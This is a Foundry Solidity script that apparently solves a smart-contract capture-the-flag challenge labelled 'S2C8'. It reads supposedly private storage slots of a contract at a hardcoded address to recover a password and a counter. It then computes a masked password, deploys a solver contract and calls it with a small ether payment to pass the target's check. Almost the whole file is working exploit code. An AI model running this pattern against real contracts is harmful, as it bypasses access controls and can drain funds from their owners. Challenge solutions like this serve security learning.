// SPDX-License-Identifier: MIT
pragma solidity >=0.8.0 <0.9.0;

import "forge-std/Script.sol";
import "forge-std/console.sol";
import "../src/SolverS2C8.sol";

contract SolveS2C8 is Script {
    function run() external {
        address target = 0x3993A65C934dEf2421685c859DaBC1d1670c1033;
        
        vm.startBroadcast();

        // 1. Read private state
        // password is at slot 1
        bytes32 password = vm.load(target, bytes32(uint256(1)));
        // count is at slot 2
        uint256 count = uint256(vm.load(target, bytes32(uint256(2))));
        
        console.log("Count:", count);
        
        // 2. Compute mask and expected argument
        // bytes32 mask = ~(bytes32(uint256(0xFF) << ((31 - (count % 32)) * 8)));
        // bytes32 newPassword = password & mask;
        
        uint256 shift = (31 - (count % 32)) * 8;
        bytes32 mask = ~(bytes32(uint256(0xFF) << shift));
        bytes32 newPassword = password & mask;
        
        console.logBytes32(newPassword);

        // 3. Deploy Solver
        SolverS2C8 solver = new SolverS2C8();
        console.log("Solver deployed at:", address(solver));
        
        // 4. Fund and Execute
        // Send enough ETH to cover the 2 wei needed + gas? 
        // Just sending 0.0001 ether to be safe.
        solver.solve{value: 0.0001 ether}(target, newPassword);
        
        vm.stopBroadcast();
    }
}
